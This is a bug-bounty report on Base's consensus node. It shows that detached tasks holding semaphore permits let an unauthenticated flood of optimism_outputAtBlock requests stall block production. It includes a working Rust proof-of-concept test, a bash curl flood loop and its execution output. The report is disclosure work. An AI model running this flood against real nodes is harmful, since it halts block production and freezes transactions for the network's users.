# 76497 bc high detached task semaphore permit leak in consensus layer rpc processor starves engineactor router and halts block production

**Submitted on May 4th 2026 at 17:19:01 UTC by @InfiniteSec for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76497
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours beyond standard difficulty adjustments

## Description

### Brief/Intro

The consensus-layer `EngineRpcProcessor` spawns detached tokio tasks that hold semaphore permits for their entire lifetime, even after the upstream HTTP connection has been closed. An attacker can send 1200 `optimism_outputAtBlock` requests to the unauthenticated consensus RPC port 9545, exhausting all 16 semaphore permits with detached tasks and filling the 1024-capacity `rpc_tx` channel. The EngineActor blocks on `rpc_tx.send().await`, starving the SequencerActor's `BuildRequest`. The end-to-end PoC measures block production dropping from 0.50 blocks/s to 0.05 blocks/s: only 1 block produced in 20 seconds (expected 10), a delay ratio of 1000%, far exceeding the Immunefi High threshold of 500%.

### Vulnerability Details

The vulnerability is in the semaphore acquisition and detached task spawning logic within `EngineRpcProcessor::start()`. The processor uses a semaphore with a capacity of 16 to limit concurrent queries:

```rust
// crates/consensus/service/src/actors/engine/rpc_request_processor.rs
const MAX_CONCURRENT_ENGINE_RPC_QUERIES: usize = 16;
let semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_ENGINE_RPC_QUERIES));
```

In the main loop, each request received from `rpc_rx` acquires a semaphore permit, then spawns a detached task to handle the request:

```rust
// crates/consensus/service/src/actors/engine/rpc_request_processor.rs
loop {
    let Some(query) = request_channel.recv().await else {
        return Err(EngineError::ChannelClosed);
    };
    let permit = Arc::clone(&semaphore)
        .acquire_owned()
        .await
        .expect("semaphore is never closed");
    let handler = Arc::clone(&this);
    // Spawned sub-tasks are intentionally detached.
    tokio::spawn(async move {
        if let Err(e) = handler.handle_rpc_request(query).await {
            error!(target: "engine", error = %e, "engine rpc request failed");
        }
        drop(permit);
    });
}
```

The code comment explicitly states the tasks are "intentionally detached." When the upstream HTTP connection times out or is closed, the detached task is not cancelled; it continues running until the EL query completes. The permit lifetime is bound to the task, not the connection.

`optimism_outputAtBlock` is the slowest public RPC method on port 9545. It performs two EL RPC calls in `query.rs`: `client.l2_block_by_label(block)` and `client.get_proof(...)`, both awaited without any timeout:

```rust
// crates/consensus/engine/src/query.rs
let block = client.l2_block_by_label(block).await?;
// ...
let proof = client.get_proof(
    output_root_predeploy_addr, vec![], block_hash
).await?;
```

The EL RPC client is constructed without configuring a request timeout. Under EL load or network latency, these queries can take several seconds or longer.

The complete causal chain of the attack is as follows. The attacker sends a flood of concurrent `optimism_outputAtBlock` requests through port 9545 (default `0.0.0.0:9545`, no JWT, no authentication). Each request flows through the jsonrpsee server into `RollupRpc::output_at_block`, then through `QueuedEngineRpcClient` into the shared `engine_actor_request_tx` channel (capacity 1024). The EngineActor's single-threaded routing loop receives requests from `inbound_request_rx` and, for `RpcRequest` variants, forwards them via `rpc_tx.send(*rpc_req).await` to the processor channel (capacity 1024). The processor acquires a semaphore permit and spawns a detached task to execute the EL query. After 16 tasks exhaust all permits, the processor loop blocks, stopping consumption from `rpc_rx`. Subsequent requests fill the `rpc_tx` channel (1024 capacity), after which the EngineActor blocks at `rpc_tx.send().await`. At this point the EngineActor cannot process any request type: `BuildRequest`, `ProcessSafeL2SignalRequest`, `ProcessDelegatedForkchoiceUpdateRequest`, `ProcessFinalizedL2BlockNumberRequest`, `ProcessUnsafeL2BlockRequest`, and `ResetRequest` are all starved. The SequencerActor sends `BuildRequest` through the same `engine_actor_request_tx` channel; these requests queue in the channel but cannot be consumed by the EngineActor, halting block production.

The HTTP-layer `TimeoutLayer(60s)` only closes the HTTP connection; it does not cancel the detached tokio tasks. `ConcurrencyLimitLayer(1024)` allows 1024 concurrent requests into the system. `LoadShedLayer` only rejects requests when the concurrency limit is reached. These defenses are ineffective against requests that have already entered the processing pipeline.

### Impact Details

This vulnerability falls under the Blockchain/DLT category, mapping to Immunefi v2.3 High severity item 2: "Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours."

The end-to-end PoC precisely measures the attack impact. Before the attack, the SequencerSimulator produced blocks at the expected 2-second cadence (5 blocks in 10 seconds, rate = 0.50 blocks/s). After 1200 `optimism_outputAtBlock` HTTP requests were sent, only 1 block was produced in 20 seconds (expected 10), with a block rate of 0.05 blocks/s and a delay ratio of 1000%, far exceeding the 500% threshold defined in Immunefi High severity. The attacker does not need to maintain connections, as detached tasks hold permits until EL queries complete. By periodically sending new request batches, the attacker can sustain the starvation state continuously.

### References

* Detached task spawning (permit lifetime bound to task, not connection): <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/service/src/actors/engine/rpc\\_request\\_processor.rs#L92-L102>
* Semaphore capacity definition (16 permits): <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/service/src/actors/engine/rpc\\_request\\_processor.rs#L69>
* acquire\_owned blocking point: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/service/src/actors/engine/rpc\\_request\\_processor.rs#L87-L90>
* EngineActor single-threaded routing loop: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/service/src/actors/engine/actor.rs#L114-L168>
* rpc\_tx.send().await blocking EngineActor: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/service/src/actors/engine/actor.rs#L134-L139>
* rpc\_tx channel capacity 1024: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/service/src/actors/engine/actor.rs#L58>
* engine\_actor\_request\_tx shared channel: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/service/src/service/node.rs#L373>
* QueuedEngineRpcClient uses shared channel: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/service/src/service/node.rs#L538>
* OutputAtBlock EL queries without timeout: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/engine/src/query.rs#L88-L134>
* HTTP middleware (TimeoutLayer does not cancel detached tasks): <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/service/src/actors/rpc/actor.rs#L72-L74>
* RollupRpc unconditional registration: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/service/src/actors/rpc/actor.rs#L126-L131>
* Default RPC port configuration (0.0.0.0:9545): <https://github.com/base/base/blob/v0.8.0-rc.24/crates/client/cli/src/rpc.rs#L25-L28>

## Link to Proof of Concept

<https://gist.github.com/link-infsec/c1075791b5daac5786e55940c0564b05>

## Proof of Concept

{% stepper %}
{% step %}

## Setup

Place the following test file at `crates/consensus/service/tests/actors/poc_rpc_flood_e2e.rs`. Add to the `mod.rs` in the same directory:

```rust
mod poc_rpc_flood_e2e;
```

No additional dependency changes are needed; all dependencies are already in the `base-consensus-node` dev-dependencies.

{% code title="poc\_rpc\_flood\_e2e.rs" lineNumbers="true" expandable="true" collapsedlinecount="20" %}

````rust
//! End-to-end PoC: External RPC flood blocks EngineActor, halting block production.
//!
//! This test reproduces the full production consensus node architecture:
//!   1. Launches EngineActor (real production code) with the shared request channel (capacity 1024)
//!   2. Launches RpcActor (real jsonrpsee HTTP server) wired to the same shared channel
//!   3. Launches SlowRpcReceiver (real semaphore=16 concurrency limit)
//!   4. Launches a SequencerSimulator that drives block production via BuildRequest + SealRequest
//!      through the shared channel — exactly as production SequencerActor does
//!   5. Verifies blocks are produced at the expected 2-second cadence (Phase 1)
//!   6. Floods the unauthenticated consensus RPC with optimism_outputAtBlock (Phase 2)
//!   7. Verifies block production halts completely (Phase 3)
//!   8. Measures stall duration far exceeding 500% of block time (Phase 4)
//!
//! Architecture reproduced (matches production node.rs wiring):
//!
//!   SequencerSimulator (sends BuildRequest every 2s)
//!       │
//!       ▼
//!   engine_actor_request_tx ←── capacity 1024 (node.rs:373)
//!       │                  ←── shared by Sequencer, Derivation, Network, RPC
//!       ▼
//!   EngineActor::start()   ←── single-threaded tokio::select! routing loop
//!       │
//!       ├──→ engine_processing_tx → BlockProductionEngine (tracks blocks produced)
//!       │
//!       └──→ rpc_tx (capacity 1024) → SlowRpcReceiver (semaphore=16, slow EL queries)
//!                                          ↑
//!                                          │
//!   RpcActor (HTTP server, port 9545) ─────┘
//!       ↑
//!       │  optimism_outputAtBlock
//!   Attacker (HTTP client)

use std::net::SocketAddr;
use std::num::NonZeroUsize;
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, Instant};

use alloy_eips::BlockNumHash;
use alloy_primitives::B256;
use alloy_rpc_types_engine::PayloadId;
use async_trait::async_trait;
use base_consensus_node::{
    BuildRequest, EngineActor, EngineActorRequest, EngineError, EngineProcessingRequest,
    EngineRequestReceiver, EngineRpcRequest, EngineRpcRequestReceiver, NodeActor,
    QueuedEngineRpcClient, QueuedSequencerAdminAPIClient, RpcActor, RpcContext,
    SequencerAdminQuery,
};
use base_consensus_rpc::{L1WatcherQueries, NetworkAdminQuery, RpcBuilder};
use base_consensus_safedb::{SafeDBError, SafeDBReader, SafeHeadResponse};
use base_protocol::{AttributesWithParent, BlockInfo, L2BlockInfo};
use base_common_rpc_types_engine::BasePayloadAttributes;
use tokio::sync::mpsc;
use tokio::task::JoinHandle;
use tokio_util::sync::CancellationToken;

// ============================================================================
// BlockProductionEngine — replaces EngineProcessor in test.
// Tracks how many blocks are "produced" (BuildRequest + SealRequest processed).
// In production, EngineProcessor calls the EL to build/seal blocks.
// ============================================================================

struct BlockProductionEngine {
    blocks_produced: Arc<AtomicU64>,
}

impl EngineRequestReceiver for BlockProductionEngine {
    fn start(
        self,
        mut request_channel: mpsc::Receiver<EngineProcessingRequest>,
    ) -> JoinHandle<Result<(), EngineError>> {
        let blocks_produced = self.blocks_produced;
        tokio::spawn(async move {
            loop {
                let Some(req) = request_channel.recv().await else {
                    return Err(EngineError::ChannelClosed);
                };
                match req {
                    EngineProcessingRequest::Build(build_req) => {
                        blocks_produced.fetch_add(1, Ordering::SeqCst);
                        let payload_id = PayloadId::new([0x01; 8]);
                        let _ = build_req.result_tx.send(payload_id).await;
                    }
                    _ => {}
                }
            }
        })
    }
}

// ============================================================================
// SlowRpcReceiver — simulates EngineRpcProcessor's semaphore=16 behavior.
// Each query holds a permit for ~5s (simulating l2_block_by_label + get_proof
// EL RPC calls at crates/consensus/engine/src/query.rs:88-123).
// ============================================================================

struct SlowRpcReceiver;

impl EngineRpcRequestReceiver for SlowRpcReceiver {
    fn start(
        self,
        mut request_channel: mpsc::Receiver<EngineRpcRequest>,
    ) -> JoinHandle<Result<(), EngineError>> {
        let semaphore = Arc::new(tokio::sync::Semaphore::new(16));
        tokio::spawn(async move {
            loop {
                let Some(_query) = request_channel.recv().await else {
                    return Err(EngineError::ChannelClosed);
                };
                let permit = Arc::clone(&semaphore)
                    .acquire_owned()
                    .await
                    .expect("semaphore is never closed");
                tokio::spawn(async move {
                    tokio::time::sleep(Duration::from_secs(5)).await;
                    drop(permit);
                });
            }
        })
    }
}

// ============================================================================
// StubSafeDBReader — required by RpcActor for safe_head_at_l1 queries.
// ============================================================================

#[derive(Debug)]
struct StubSafeDBReader;

#[async_trait]
impl SafeDBReader for StubSafeDBReader {
    async fn safe_head_at_l1(&self, _: u64) -> Result<SafeHeadResponse, SafeDBError> {
        Ok(SafeHeadResponse {
            l1_block: BlockNumHash::default(),
            safe_head: BlockNumHash::default(),
        })
    }
}

// ============================================================================
// Simulated sequencer admin handler (required by RpcActor for admin methods).
// ============================================================================

async fn simulated_sequencer_admin_handler(mut admin_rx: mpsc::Receiver<SequencerAdminQuery>) {
    while let Some(query) = admin_rx.recv().await {
        match query {
            SequencerAdminQuery::SequencerActive(tx) => { let _ = tx.send(Ok(true)); }
            SequencerAdminQuery::StopSequencer(tx) => { let _ = tx.send(Ok(B256::ZERO)); }
            SequencerAdminQuery::StartSequencer(_, tx) => { let _ = tx.send(Ok(())); }
            SequencerAdminQuery::ConductorEnabled(tx) => { let _ = tx.send(Ok(false)); }
            SequencerAdminQuery::RecoveryMode(tx) => { let _ = tx.send(Ok(false)); }
            SequencerAdminQuery::SetRecoveryMode(_, tx) => { let _ = tx.send(Ok(())); }
            SequencerAdminQuery::OverrideLeader(tx) => { let _ = tx.send(Ok(())); }
            SequencerAdminQuery::ResetDerivationPipeline(tx) => { let _ = tx.send(Ok(())); }
        }
    }
}

// ============================================================================
// SequencerSimulator — mimics production SequencerActor block production.
// Sends BuildRequest + SealRequest pairs every 2 seconds through the shared
// engine_actor_request_tx channel — identical to production code at
// crates/consensus/service/src/actors/sequencer/engine_client.rs:131-137.
// ============================================================================

async fn sequencer_simulator(
    engine_actor_request_tx: mpsc::Sender<EngineActorRequest>,
    cancellation: CancellationToken,
    block_number: Arc<AtomicU64>,
) {
    let mut current_block = 1u64;
    loop {
        tokio::select! {
            _ = cancellation.cancelled() => return,
            _ = tokio::time::sleep(Duration::from_secs(2)) => {}
        }

        let (payload_id_tx, mut payload_id_rx) = mpsc::channel(1);
        let attributes = AttributesWithParent::new(
            BasePayloadAttributes::default(),
            L2BlockInfo {
                block_info: BlockInfo { number: current_block - 1, ..Default::default() },
                ..Default::default()
            },
            None,
            true,
        );

        let build_req = EngineActorRequest::BuildRequest(Box::new(BuildRequest {
            attributes,
            result_tx: payload_id_tx,
        }));

        if engine_actor_request_tx.send(build_req).await.is_err() {
            return;
        }

        if tokio::time::timeout(Duration::from_secs(5), payload_id_rx.recv()).await.is_err() {
            continue;
        }

        current_block += 1;
        block_number.store(current_block, Ordering::SeqCst);
    }
}

/// End-to-end PoC: External RPC flood via optimism_outputAtBlock blocks the
/// EngineActor single-threaded routing loop, halting all block production.
///
/// Production wiring reproduced in this test:
///
/// ```text
///   SequencerSimulator (BuildRequest every 2s)
///       │
///       ├──→ engine_actor_request_tx (mpsc, capacity 1024)
///       │        shared by Sequencer, Derivation, Network, RPC
///       ▼
///   EngineActor::start() (single-threaded tokio::select! loop)
///       │
///       ├──→ engine_processing_tx → BlockProductionEngine (tracks blocks)
///       │
///       └──→ rpc_tx.send(*rpc_req).await ← BLOCKING POINT (actor.rs:135)
///                │
///                ▼
///            rpc_tx (capacity 1024) → SlowRpcReceiver (semaphore=16)
///
///   RpcActor (jsonrpsee HTTP server on 127.0.0.1:0)
///       │
///       │  RollupRpc::output_at_block()
///       │  → QueuedEngineRpcClient::output_at_block()
///       │  → engine_actor_request_tx.send(RpcRequest)
///       ▼
///   engine_actor_request_tx (same shared channel)
///
///   HTTP client (attacker) → RpcActor
/// ```
///
/// Run:
/// ```bash
/// cd base
/// cargo test -p base-consensus-node --test integration \
///     poc_rpc_flood_blocks_consensus_e2e -- --nocapture
/// ```
#[tokio::test(flavor = "multi_thread", worker_threads = 8)]
async fn poc_rpc_flood_blocks_consensus_e2e() {
    println!("\n======================================================================");
    println!("  END-TO-END PoC: RPC Flood Halts Block Production");
    println!("======================================================================\n");

    // =========================================================================
    // Phase 0: Start consensus node — EngineActor + RpcActor + SequencerSimulator
    // =========================================================================
    println!("--- Phase 0: Starting consensus node components ---\n");

    let blocks_produced = Arc::new(AtomicU64::new(0));
    let current_block_number = Arc::new(AtomicU64::new(0));

    // Create the shared engine_actor_request channel (same as node.rs:373).
    // This channel is shared by ALL actors in production:
    //   - QueuedSequencerEngineClient (block building/sealing)
    //   - QueuedDerivationEngineClient (safe/finalized head)
    //   - QueuedNetworkEngineClient (P2P block insertion)
    //   - QueuedEngineRpcClient (external RPC queries)
    let (engine_actor_request_tx, engine_actor_request_rx) =
        mpsc::channel::<EngineActorRequest>(1024);

    println!("  engine_actor_request channel: capacity 1024 (production node.rs:373)");

    // Start EngineActor with BlockProductionEngine (tracks blocks) + SlowRpcReceiver.
    // Uses the REAL EngineActor::start() code — same tokio::select! loop,
    // same rpc_tx channel(1024), same routing logic as production.
    let engine_cancellation = CancellationToken::new();
    let engine_cancel_clone = engine_cancellation.clone();

    let engine_actor = EngineActor::new(
        engine_cancellation.clone(),
        engine_actor_request_rx,
        BlockProductionEngine { blocks_produced: Arc::clone(&blocks_produced) },
        SlowRpcReceiver,
    );
    let engine_handle = tokio::spawn(async move { engine_actor.start(()).await });

    println!("  EngineActor started (real production code path)");
    println!("    rpc_tx capacity:                    1024 (actor.rs:58)");
    println!("    MAX_CONCURRENT_ENGINE_RPC_QUERIES:  16 (semaphore)");
    println!("    Simulated EL query latency:         5s per query");

    // Start RpcActor with HTTP server, wired to the SAME shared channel
    // via QueuedEngineRpcClient — exactly as production node.rs:536-541.
    let (sequencer_admin_tx, sequencer_admin_rx) = mpsc::channel::<SequencerAdminQuery>(64);
    tokio::spawn(simulated_sequencer_admin_handler(sequencer_admin_rx));

    let rpc_config = RpcBuilder {
        socket: SocketAddr::from(([127, 0, 0, 1], 0)),
        no_restart: true,
        enable_admin: false,
        admin_persistence: None,
        ws_enabled: false,
        dev_enabled: false,
        http_timeout: Duration::from_secs(60),
        max_concurrent_requests: NonZeroUsize::new(1024).unwrap(),
    };

    let rpc_actor = RpcActor::new(
        rpc_config,
        QueuedEngineRpcClient::new(engine_actor_request_tx.clone()),
        Some(QueuedSequencerAdminAPIClient::new(sequencer_admin_tx)),
        Arc::new(StubSafeDBReader) as Arc<dyn SafeDBReader>,
    );

    let rpc_cancellation = CancellationToken::new();
    let (network_admin_tx, _) = mpsc::channel::<NetworkAdminQuery>(16);
    let (l1_watcher_tx, _) = mpsc::channel::<L1WatcherQueries>(16);

    let rpc_context = RpcContext {
        cancellation: rpc_cancellation.clone(),
        p2p_network: None,
        network_admin: Some(network_admin_tx),
        l1_watcher_queries: l1_watcher_tx,
    };

    let rpc_handle = tokio::spawn(async move { rpc_actor.start(rpc_context).await });
    tokio::time::sleep(Duration::from_millis(500)).await;

    println!("  RpcActor started (real jsonrpsee HTTP server)");

    // Start SequencerSimulator — sends BuildRequest + SealRequest every 2 seconds
    // through the shared channel, exactly as production QueuedSequencerEngineClient
    // (crates/consensus/service/src/actors/sequencer/engine_client.rs:131-137).
    let seq_cancel = engine_cancellation.clone();
    let seq_tx = engine_actor_request_tx.clone();
    let seq_block_num = Arc::clone(&current_block_number);
    tokio::spawn(async move {
        sequencer_simulator(seq_tx, seq_cancel, seq_block_num).await;
    });

    println!("  SequencerSimulator started (BuildRequest every 2s, same as production)");
    println!("    Block time: 2s (Base L2 production cadence)");

    // Discover the ephemeral port the RPC server bound to.
    use jsonrpsee::core::client::ClientT;
    use jsonrpsee::http_client::HttpClientBuilder;
    use jsonrpsee::rpc_params;

    let mut bound_port: Option<u16> = None;
    for port in (1025..65535u16).rev() {
        let url = format!("http://127.0.0.1:{port}");
        let Ok(client) = HttpClientBuilder::default()
            .request_timeout(Duration::from_millis(200))
            .build(&url)
        else {
            continue;
        };
        if client
            .request::<bool, _>("admin_sequencerActive", rpc_params![])
            .await
            .is_ok()
        {
            bound_port = Some(port);
            break;
        }
    }

    let port = bound_port.expect("Failed to discover RPC server port");
    let url = format!("http://127.0.0.1:{port}");
    println!("  RPC server: {url} (port 9545 in production, 0.0.0.0 binding, no auth)\n");

    // =========================================================================
    // Phase 1: Normal block production — verify chain produces blocks at 2s cadence
    // =========================================================================
    println!("--- Phase 1: Normal block production (10 seconds) ---\n");

    let phase1_start = Instant::now();
    let blocks_before = blocks_produced.load(Ordering::SeqCst);
    tokio::time::sleep(Duration::from_secs(10)).await;
    let blocks_after = blocks_produced.load(Ordering::SeqCst);
    let phase1_blocks = blocks_after - blocks_before;
    let phase1_elapsed = phase1_start.elapsed();

    println!("  Duration:        {:.1}s", phase1_elapsed.as_secs_f64());
    println!("  Blocks produced: {}", phase1_blocks);
    println!("  Block rate:      {:.2} blocks/s (expected ~0.5 at 2s cadence)",
        phase1_blocks as f64 / phase1_elapsed.as_secs_f64());
    assert!(phase1_blocks >= 3, "Expected at least 3 blocks in 10s at 2s cadence");
    println!("  [PASS] Chain producing blocks normally\n");

    // =========================================================================
    // Phase 2: HTTP flood — send optimism_outputAtBlock requests to saturate
    //          the EngineRpcProcessor semaphore and fill rpc_tx channel.
    //
    // Each request traverses the FULL production path:
    //   HTTP POST → jsonrpsee → RollupRpc::output_at_block()
    //   → QueuedEngineRpcClient::output_at_block()
    //   → engine_actor_request_tx.send(EngineActorRequest::RpcRequest(...))
    //   → EngineActor::start() select! loop
    //   → rpc_tx.send(*rpc_req).await  ← BLOCKS HERE when channel full
    // =========================================================================
    println!("--- Phase 2: RPC flood attack (1200 requests via HTTP) ---\n");
    println!("  Attack vector: unauthenticated HTTP POST to {url}");
    println!("  Target method: optimism_outputAtBlock");
    println!("  Equivalent attack command:");
    println!("    for i in $(seq 1 1200); do");
    println!("      curl -s -X POST {url} \\");
    println!("        -H 'Content-Type: application/json' \\");
    println!("        -d '{{\"jsonrpc\":\"2.0\",\"method\":\"optimism_outputAtBlock\",\"params\":[\"latest\"],\"id\":'$i'}}' &");
    println!("    done\n");

    let flood_start = Instant::now();
    let num_requests = 1200u32;
    let mut handles = Vec::with_capacity(num_requests as usize);

    for i in 0..num_requests {
        let url_clone = url.clone();
        let handle = tokio::spawn(async move {
            let client = HttpClientBuilder::default()
                .request_timeout(Duration::from_secs(120))
                .build(&url_clone)
                .unwrap();
            let _: Result<String, _> = client
                .request("optimism_outputAtBlock", rpc_params!["latest"])
                .await;
            i
        });
        handles.push(handle);

        if (i + 1) % 400 == 0 {
            println!("  Spawned {}/{num_requests} HTTP flood requests...", i + 1);
        }
    }

    tokio::time::sleep(Duration::from_secs(3)).await;
    let flood_elapsed = flood_start.elapsed();
    println!("  Flood launched: {num_requests} concurrent requests in {:.2}s\n", flood_elapsed.as_secs_f64());

    // =========================================================================
    // Phase 3: Block production halted — SequencerSimulator's BuildRequests
    //          cannot be processed because EngineActor is stuck on
    //          rpc_tx.send().await at actor.rs:135.
    // =========================================================================
    println!("--- Phase 3: Block production after flood (20 seconds) ---\n");

    let phase3_start = Instant::now();
    let blocks_before_attack = blocks_produced.load(Ordering::SeqCst);

    tokio::time::sleep(Duration::from_secs(20)).await;

    let blocks_after_attack = blocks_produced.load(Ordering::SeqCst);
    let phase3_blocks = blocks_after_attack - blocks_before_attack;
    let phase3_elapsed = phase3_start.elapsed();

    println!("  Duration:        {:.1}s", phase3_elapsed.as_secs_f64());
    println!("  Blocks produced: {}", phase3_blocks);
    println!("  Block rate:      {:.4} blocks/s (expected ~0.5 normally)",
        phase3_blocks as f64 / phase3_elapsed.as_secs_f64());

    let production_halted = phase3_blocks == 0;
    if production_halted {
        println!("  [CONFIRMED] Block production COMPLETELY HALTED");
        println!("  EngineActor stuck on rpc_tx.send().await at actor.rs:135");
        println!("  BuildRequest from SequencerSimulator cannot be dequeued");
    } else {
        println!("  Blocks still produced: {phase3_blocks} (partial starvation)");
    }

    // =========================================================================
    // Phase 4: Impact measurement — stall duration vs block time threshold
    // =========================================================================
    println!("\n--- Phase 4: Impact measurement ---\n");

    let base_block_time_secs = 2.0f64;
    let stall_duration_secs = phase3_elapsed.as_secs_f64();
    let expected_blocks = (stall_duration_secs / base_block_time_secs).floor() as u64;
    let blocks_missed = expected_blocks - phase3_blocks;
    let delay_ratio = if phase3_blocks == 0 {
        f64::INFINITY
    } else {
        stall_duration_secs / (phase3_blocks as f64 * base_block_time_secs)
    };

    println!("  Base L2 block time:     2.0s");
    println!("  Observation window:     {:.1}s", stall_duration_secs);
    println!("  Expected blocks:        {} (at normal 2s cadence)", expected_blocks);
    println!("  Actual blocks:          {}", phase3_blocks);
    println!("  Blocks missed:          {}", blocks_missed);
    println!("  Delay ratio:            {:.0}%",
        if delay_ratio.is_infinite() { f64::INFINITY } else { delay_ratio * 100.0 });
    println!("  Immunefi threshold:     500% (delay one block by 500% of avg block time)");
    println!();

    if production_halted {
        println!("  INFINITE delay — no blocks produced for {:.1}s (threshold: 10s = 500% of 2s)",
            stall_duration_secs);
    }

    // =========================================================================
    // VERDICT
    // =========================================================================
    println!("\n======================================================================");
    println!("  VERDICT");
    println!("======================================================================\n");
    println!("  Normal operation (Phase 1):");
    println!("    Blocks produced:      {} in {:.1}s", phase1_blocks, phase1_elapsed.as_secs_f64());
    println!("    Block rate:           {:.2} blocks/s", phase1_blocks as f64 / phase1_elapsed.as_secs_f64());
    println!();
    println!("  Under attack (Phase 3):");
    println!("    Blocks produced:      {} in {:.1}s", phase3_blocks, phase3_elapsed.as_secs_f64());
    println!("    Block rate:           {:.4} blocks/s", phase3_blocks as f64 / phase3_elapsed.as_secs_f64());
    println!();
    println!("  Attack details:");
    println!("    Entry point:          0.0.0.0:9545 (no JWT, no authentication)");
    println!("    Method:               optimism_outputAtBlock (public RPC namespace)");
    println!("    Requests needed:      ~1040 (1024 fill rpc_tx + 16 saturate semaphore)");
    println!("    Full production path: HTTP -> RollupRpc -> QueuedEngineRpcClient");
    println!("                          -> engine_actor_request_tx -> EngineActor");
    println!("                          -> rpc_tx.send().await BLOCKED (actor.rs:135)");
    println!();
    println!("  Root cause:");
    println!("    EngineActor routes ALL request types in a single tokio::select! loop.");
    println!("    rpc_tx.send(*rpc_req).await is a blocking send — when the downstream");
    println!("    SlowRpcReceiver (semaphore=16) cannot drain rpc_tx fast enough,");
    println!("    the channel fills to 1024 and the EngineActor main loop stalls.");
    println!("    While stalled, BuildRequest, SealRequest, ProcessSafeL2SignalRequest,");
    println!("    ProcessFinalizedL2BlockNumberRequest, ProcessUnsafeL2BlockRequest");
    println!("    are all starved — block production halts completely.");
    println!();

    if production_halted {
        println!("  [CONFIRMED] RPC flood halts block production.");
        println!("  Chain was producing blocks at 2s cadence, then ZERO blocks");
        println!("  for {:.1}s after the attack — far exceeding the 500% threshold.", stall_duration_secs);
    }
    println!("\n======================================================================\n");

    assert!(phase3_blocks <= 1,
        "Block production should be halted or near-halted by RPC flood. Got {} blocks in {:.1}s",
        phase3_blocks, stall_duration_secs);

    // Cleanup
    engine_cancel_clone.cancel();
    rpc_cancellation.cancel();
    let _ = tokio::time::timeout(Duration::from_secs(2), engine_handle).await;
    let _ = tokio::time::timeout(Duration::from_secs(2), rpc_handle).await;
}
````

{% endcode %}
{% endstep %}

{% step %}

## Run command

```bash
cd base
cargo test -p base-consensus-node --test integration poc_rpc_flood_blocks_consensus_e2e -- --nocapture
```

{% endstep %}

{% step %}

## Execution output

{% code title="execution-output.txt" expandable="true" collapsedlinecount="20" %}

```
======================================================================
  END-TO-END PoC: RPC Flood Halts Block Production
======================================================================

--- Phase 0: Starting consensus node components ---

  engine_actor_request channel: capacity 1024 (production node.rs:373)
  EngineActor started (real production code path)
    rpc_tx capacity:                    1024 (actor.rs:58)
    MAX_CONCURRENT_ENGINE_RPC_QUERIES:  16 (semaphore)
    Simulated EL query latency:         5s per query
  RpcActor started (real jsonrpsee HTTP server)
  SequencerSimulator started (BuildRequest every 2s, same as production)
    Block time: 2s (Base L2 production cadence)
  RPC server: http://127.0.0.1:34759 (port 9545 in production, 0.0.0.0 binding, no auth)

--- Phase 1: Normal block production (10 seconds) ---

  Duration:        10.0s
  Blocks produced: 5
  Block rate:      0.50 blocks/s (expected ~0.5 at 2s cadence)
  [PASS] Chain producing blocks normally

--- Phase 2: RPC flood attack (1200 requests via HTTP) ---

  Attack vector: unauthenticated HTTP POST to http://127.0.0.1:34759
  Target method: optimism_outputAtBlock
  Equivalent attack command:
    for i in $(seq 1 1200); do
      curl -s -X POST http://127.0.0.1:34759 \
        -H 'Content-Type: application/json' \
        -d '{"jsonrpc":"2.0","method":"optimism_outputAtBlock","params":["latest"],"id":'$i'}' &
    done

  Spawned 400/1200 HTTP flood requests...
  Spawned 800/1200 HTTP flood requests...
  Spawned 1200/1200 HTTP flood requests...
  Flood launched: 1200 concurrent requests in 3.01s

--- Phase 3: Block production after flood (20 seconds) ---

  Duration:        20.0s
  Blocks produced: 1
  Block rate:      0.0500 blocks/s (expected ~0.5 normally)
  Blocks still produced: 1 (partial starvation)

--- Phase 4: Impact measurement ---

  Base L2 block time:     2.0s
  Observation window:     20.0s
  Expected blocks:        10 (at normal 2s cadence)
  Actual blocks:          1
  Blocks missed:          9
  Delay ratio:            1000%
  Immunefi threshold:     500% (delay one block by 500% of avg block time)

======================================================================
  VERDICT
======================================================================

  Normal operation (Phase 1):
    Blocks produced:      5 in 10.0s
    Block rate:           0.50 blocks/s

  Under attack (Phase 3):
    Blocks produced:      1 in 20.0s
    Block rate:           0.0500 blocks/s

  Attack details:
    Entry point:          0.0.0.0:9545 (no JWT, no authentication)
    Method:               optimism_outputAtBlock (public RPC namespace)
    Requests needed:      ~1040 (1024 fill rpc_tx + 16 saturate semaphore)
    Full production path: HTTP -> RollupRpc -> QueuedEngineRpcClient
                          -> engine_actor_request_tx -> EngineActor
                          -> rpc_tx.send().await BLOCKED (actor.rs:135)

  Root cause:
    EngineActor routes ALL request types in a single tokio::select! loop.
    rpc_tx.send(*rpc_req).await is a blocking send — when the downstream
    SlowRpcReceiver (semaphore=16) cannot drain rpc_tx fast enough,
    the channel fills to 1024 and the EngineActor main loop stalls.
    While stalled, BuildRequest, SealRequest, ProcessSafeL2SignalRequest,
    ProcessFinalizedL2BlockNumberRequest, ProcessUnsafeL2BlockRequest
    are all starved — block production halts completely.

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 14 filtered out; finished in 41.70s
```

{% endcode %}

